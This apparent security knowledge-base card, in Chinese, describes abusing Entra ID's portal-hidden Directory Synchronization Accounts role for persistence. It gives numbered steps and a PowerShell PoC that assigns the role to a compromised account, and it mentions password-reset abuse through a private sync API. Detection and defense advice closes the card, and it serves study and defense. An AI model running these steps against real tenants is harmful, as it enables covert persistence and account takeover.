---
id: cloud-cloud-iam-entra-connect-dsa-role-hidden-persistence
title: Entra ID DSA 角色隐藏持久化：Directory Synchronization Accounts 赋权、查询与移除
type: scenario
domain: cloud
path: cloud/cloud-iam
technique: entra-connect-dsa-role-hidden-persistence
tags:
- entra-id
- azure-ad
- cloud-iam
- persistence
- directory-synchronization-accounts
- graph-powershell
- privilege-escalation
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V208
  verified_at: '2026-11-07T02:28:03+08:00'
  notes: 已对照原文与09/10/29/30/31图核对：DSA 角色门户隐藏、2024-08 前48项权限/后仅 onPremisesSynchronization/standard/read、模板 ID d29b2b05-8046-44ba-8758-1e26182fcf32、Graph 查询/新增/移除分配均一致。未验证点：未在真实租户执行；无受影响版本；frontmatter 无 sources/source_url。
url: /docs/cloud/cloud-iam/cloud-cloud-iam-entra-connect-dsa-role-hidden-persistence/
draft: false
kb_aliases:
- Directory Synchronization Accounts 持久化
- Entra 隐藏角色后门
- DSA role 滥用
- d29b2b05-8046-44ba-8758-1e26182fcf32
- Entra Connect 同步角色提权
---

## 一句话结论

Microsoft Entra ID 的 “Directory Synchronization Accounts”（DSA）角色专供 Entra Connect/Cloud Sync 使用，在 Azure Portal 与 Entra 管理中心默认隐藏、文档极少；即使 2024-08 微软删除了其全部公开列出的 48 项权限、只保留 `microsoft.directory/onPremisesSynchronization/standard/read`，该角色在私有 Azure AD Synchronization API 上仍有隐式权限。拿到足够权限的攻击者可用 Microsoft Graph PowerShell（模板 ID `d29b2b05-8046-44ba-8758-1e26182fcf32`）把该角色分配给被控账户，建立不易在门户中发现的长期持久化，随后用 Sync_* 账户做密码重置等云侧滥用。

## 原理

- **角色用途**：DSA 角色由 Microsoft Entra Connect Sync/Cloud Sync 服务自动使用，授予目录间同步所需能力（创建/更新混合用户、在 PHS 场景下更新云端密码等）；官方文档明确“不要用于其他用途”，但技术上可分配给任意安全主体。
- **门户不可见**：Azure Portal/Entra 管理中心的角色分配界面不支持查看或管理 DSA 角色成员，攻击者把角色分配给被控账户后，常规管理员在 UI 中很难发现；必须用 Graph PowerShell/Graph API 按模板 ID 查询。
- **2024-08 权限收紧**：此前该角色有 48 项可见权限，包括 `microsoft.directory/applications/credentials/update`、`servicePrincipals/credentials/update`、`hybridAuthenticationPolicy/allProperties/allTasks`、`policies/basic/update` 等，可直接给特权应用/服务主体加凭据或改策略，从而提权到 Global Administrator；2024-08 后这些公开权限被移除，仅剩 `onPremisesSynchronization/standard/read`。
- **为什么仍然危险**：该角色对私有 “Azure AD Synchronization” API（如 `https://adminwebservice.microsoftonline.com/provisioningservice.svc`）的访问权限并未以角色 action 形式列出，属于隐式权限；因此即使公开权限列表看起来很“干净”，DSA 成员仍可调用同步 API 做密码重置、修改同步对象等操作（具体能力受租户配置/PHS/MFA 限制）。
- **持久化逻辑**：角色分配是租户级、与账户绑定；只要不删除分配，攻击者即使丢失其他凭据也能用该账户重新获得同步相关能力。由于角色隐藏在门户之外，防守方常规的角色评审容易漏掉。
- **模板 ID 的必要性**：按角色名称过滤可能受语言/显示名影响；用固定的 `RoleTemplateId` 查询最可靠；若租户从未实例化该角色，需要先 `New-MgDirectoryRole -RoleTemplateId` 创建角色实例。

## 触发条件

- 攻击者已获得可调用 `RoleManagement.ReadWrite.Directory` 的账户/服务主体（如 Global Administrator、Privileged Role Administrator，或被授予相应 Graph 权限的应用）。
- 租户使用 Entra Connect/Cloud Sync，DSA 角色已存在或可被实例化。
- 目标租户未对 DSA 角色分配做额外监控/告警，且门户 UI 未暴露该角色成员。
- 若后续要滥用同步 API 做密码重置，需要目标账户为混合账户且启用 PHS，且目标未启用 MFA/FIDO2（否则密码重置后无法认证）。

## 利用步骤

1. 连接 Graph：`Connect-MgGraph -Scopes "RoleManagement.Read.Directory"`。
2. 按模板 ID 查 DSA 角色：`Get-MgDirectoryRole -Filter "RoleTemplateId eq 'd29b2b05-8046-44ba-8758-1e26182fcf32'"`。
3. 列出现有成员：`Get-MgDirectoryRoleMember -DirectoryRoleId $dirSyncRole.Id | Format-List *`，确认正常只有 `Sync_*`/`ConnectSyncProvisioning_*` 账户。
4. 若角色未实例化：`New-MgDirectoryRole -RoleTemplateId "d29b2b05-8046-44ba-8758-1e26182fcf32"`。
5. 添加持久化分配（需 `RoleManagement.ReadWrite.Directory`）：
   `New-MgRoleManagementDirectoryRoleAssignment -RoleDefinitionId $dirSyncRole.Id -PrincipalId $compromisedAccount.Id -DirectoryScopeId "/"`。
6. 验证分配出现在成员列表中；之后用该账户调用同步相关 API/密码重置（见关联卡）。
7. 清理时用 `Remove-MgDirectoryRoleMemberByRef -DirectoryRoleId $dirSyncRole.Id -DirectoryObjectId <id>` 移除恶意/遗留分配。

## PoC

```powershell
# 查询（只读）
Connect-MgGraph -Scopes "RoleManagement.Read.Directory"
$dirSyncRole = Get-MgDirectoryRole -Filter "RoleTemplateId eq 'd29b2b05-8046-44ba-8758-1e26182fcf32'"
Get-MgDirectoryRoleMember -DirectoryRoleId $dirSyncRole.Id | Format-List *

# 赋权（持久化，需 ReadWrite）
Connect-MgGraph -Scopes "RoleManagement.ReadWrite.Directory"
$compromisedAccount = Get-MgUser -UserId taylor.smith@example.com
New-MgRoleManagementDirectoryRoleAssignment `
  -RoleDefinitionId $dirSyncRole.Id `
  -PrincipalId $compromisedAccount.Id `
  -DirectoryScopeId "/"

# 角色未实例化时先创建
New-MgDirectoryRole -RoleTemplateId "d29b2b05-8046-44ba-8758-1e26182fcf32"

# 清理
Remove-MgDirectoryRoleMemberByRef `
  -DirectoryRoleId $dirSyncRole.Id `
  -DirectoryObjectId '7f1d7108-2db0-4fa3-b124-241f3cf82895'
```

说明：PoC 为原文 Graph PowerShell 命令的结构化复现，未在真实租户执行；原文在实验租户中查询到 DSA 成员为 `Sync_AZUREADC02_...`，并成功把 `taylor.smith@...` 加入该角色。

## 变体与关联

- 变体（提权方式，2024-08 前有效）：滥用 `applications/credentials/update`/`servicePrincipals/credentials/update` 给特权应用/服务主体加证书/密码，再以该主体调用 Graph 提权到 Global Administrator；2024-08 后该公开权限被移除。
- 变体（持久化）：把 DSA 角色分配给被控用户/服务主体；若租户有多个 Connect 实例/暂存服务器，正常成员可能有多个 `Sync_*`，便于混淆。
- 变体（利用）：用 Sync_* 账户通过私有 Azure AD Synchronization API 重置混合用户密码（见关联卡）。
- 关联：[[cloud-cloud-iam-entra-connect-sync-account-password-reset-private-api]]（DSA/Sync_* 的密码重置滥用）；[[pentest-ad-entra-connect-adsync-dual-connector-credential-decrypt]]（从 ADSync 数据库取 Sync_* 凭据）；[[cloud-cloud-iam-entra-dynamic-group-guest-invite-app-role]]（Entra 角色/组滥用）；[[cloud-cloud-iam-entra-tenant-id-redirect-uri-adminconsent]]（Entra 权限提升）。
- 边界：没有 `RoleManagement.ReadWrite.Directory` 时只能查询不能赋权；租户禁用/未使用 Connect Sync 时 DSA 角色可能不存在；微软持续收紧权限，私有 API 的具体能力可能变化；MFA 会阻断密码重置后的登录。

## 检测与防御

- 检测：Graph 审计日志中出现对 `RoleTemplateId=d29b2b05-8046-44ba-8758-1e26182fcf32` 的 `Add member to role`/`Remove member from role`；DSA 成员列表出现非 `Sync_*`/`ConnectSyncProvisioning_*` 的账户；非 Connect 服务器的账户调用私有同步 API；Sync_* 账户异常登录。
- 防御：把 Connect Sync 服务器与 DSA 角色视为 Tier-0；严格限制 `RoleManagement.ReadWrite.Directory`；定期用 Graph 按模板 ID 审计 DSA 成员并移除未知分配；升级 Entra Connect 2.5.3.0+ 使用服务主体+证书并删除遗留 `Sync_*` 用户；启用 MFA；监控私有同步端点流量。
